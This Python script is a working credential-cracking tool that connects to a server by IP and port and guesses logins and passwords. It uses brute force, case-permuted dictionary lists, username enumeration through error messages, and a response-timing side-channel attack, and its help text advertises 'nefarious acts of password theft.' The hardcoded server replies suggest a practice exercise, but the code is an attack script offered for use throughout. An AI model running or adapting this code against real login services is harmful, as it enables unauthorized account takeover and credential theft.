import argparse
import itertools
import json
import socket
import time

# For Brute Force
possible_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
all_usual_chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
empty_password = " "

# Password Guesser
def bruteForcePassword(client_socket, char_list):
    for i in range(1, 6):
        for tuple in itertools.product(char_list, repeat= i):
            # Generate a password and guess
            password_guess = ''.join(tuple)
            client_socket.send(password_guess.encode())

            # Recieve either success, wrong or too many attempts
            server_response = client_socket.recv(1024).decode()
            if server_response == 'Connection success!' or server_response == 'Too many attempts':
                return password_guess

def dictionaryPassword(client_socket, password_list):
    # iterate through each word from the list
    for i in range(len(password_list)):
        # generate a new list of every possible case combination of word
        pass_combo_list = caseComboList(password_list[i])
        for j in range(len(pass_combo_list)):
            # send each password
            password_guess = pass_combo_list[j]
            client_socket.send(password_guess.encode())

            # get server response
            server_response = client_socket.recv(1024).decode()
            if server_response == 'Connection success!' or server_response == 'Too many attempts':
                return password_guess

def caseComboList(word):
    word = word.rstrip() # removes '\n' from the readlines command
    words = ['']
    for character in word:
        if character.isalpha():
            words_upper = words[:] # Deep copy of words
            for i in range(len(words)):
                words[i] = words[i] + character.lower()
            for i in range(len(words_upper)):
                words_upper[i] = words_upper[i] + character.upper()
            words = words + words_upper
        else:
            for i in range(len(words)):
                words[i] = words[i] + character
    return words

def dictionaryLoginGuesser(client_socket, login_list):
    # iterate through each word in list
    admin_login = "Error: no login found"
    for i in range(len(login_list)):
        count = 0
        login_combo_list = caseComboList(login_list[i])
        for j in range(len(login_combo_list)):
            json_admin_guess = json.dumps(dict({"login": str(login_combo_list[j]),"password": str(empty_password)}))
            client_socket.send(json_admin_guess.encode())

            # "result" : "Wrong login!" or "Wrong password!" (of maybe "Exception happened during login"
            json_server_response = json.loads(client_socket.recv(1024).decode())
            server_response = json_server_response.get("result")

            if server_response == "Wrong password!":
                admin_login = login_combo_list[j]
                break
            elif server_response == "Exception happened during login":
                print(server_response)
            count += 1
    return admin_login

def weaknessBruteForcePasswordGuesser(client_socket, admin_login):
    server_response = ''
    password = ''
    while server_response != "Connection success!":
        for char in all_usual_chars:
            password_guess = ''.join([password[:], char])
            json_password_guess = json.dumps(dict({"login": str(admin_login),"password": str(password_guess)}))

            client_socket.send(json_password_guess.encode())

            json_server_response = json.loads(client_socket.recv(1024).decode())
            server_response = json_server_response.get("result")
            if server_response == "Connection success!" or server_response == "Exception happened during login":
                password = password_guess
                break
    return password

def timeAttackPasswordGuesser(client_socket, admin_login):

    server_response = ''
    password = ''
    inter_password_guess = ''
    total_guesses = 0
    average_time = 0
    time_to_guess = False

    # what magnitude higher the wait time needs to be considered
    # throwing an exception server side
    threshold = 10
    # iterations needed to get average wait time
    num_of_guesses_to_get_average = len(all_usual_chars)

    while server_response != "Connection success!":
        for char in all_usual_chars:
            password_guess = ''.join([inter_password_guess[:], char])
            json_password_guess = json.dumps(dict({"login": str(admin_login), "password": str(password_guess)}))

            # take start time and send guess
            start_relative_time = time.perf_counter()
            client_socket.send(json_password_guess.encode())

            # get response and end time
            json_server_response = json.loads(client_socket.recv(1024).decode())
            end_relative_time = time.perf_counter()

            total_guesses += 1
            relative_time_spent = end_relative_time - start_relative_time
            server_response = json_server_response.get("result")

            if server_response == "Connection success!":
                password = password_guess
                break

            # First get an understanding of the average wait time
            if not time_to_guess:
                if total_guesses < num_of_guesses_to_get_average:
                    average_time = ((total_guesses - 1) * average_time + relative_time_spent) / total_guesses
                    password_guess = ''
                    continue
                else:
                    password_guess = ''
                    time_to_guess = True
                    break
            # Now it's time to start guessing
            else:
                if relative_time_spent > average_time + (threshold - 1) * average_time:
                    #print("Grow", char, inter_password_guess, relative_time_spent, average_time)
                    inter_password_guess = password_guess
                    total_guesses = 0
                    average_time = 0
                    time_to_guess = False

    return password

# --- Program ---

# Setup argparser
hack_parser = argparse.ArgumentParser(description= "This program will aid you in nefarious acts of password theft.")
hack_parser.add_argument("site_ip_address", type= str, help= "Provide the site's IP address.")
hack_parser.add_argument("site_port", type= int, help= "Please provide the port number of the site.")

# Obtain arguments from command line (aka the site)
args = hack_parser.parse_args()

# Get command line arguments
site_ip_address = args.site_ip_address
site_port = args.site_port

site_address = (site_ip_address, site_port)

with socket.socket() as client_socket:
    # Connect to pseudo-client & send message
    client_socket.connect(site_address)

    # Brute Force with common password list
    admin_login = ''
    with open('logins.txt', 'r') as login_string_list:
        login_list = login_string_list.readlines()

        # Receive message, print & quit
        admin_login = dictionaryLoginGuesser(client_socket, login_list)

    admin_password = timeAttackPasswordGuesser(client_socket, admin_login)

    json_site_credentials = json.dumps(dict({"login": admin_login, "password": admin_password}))

    print(json_site_credentials)
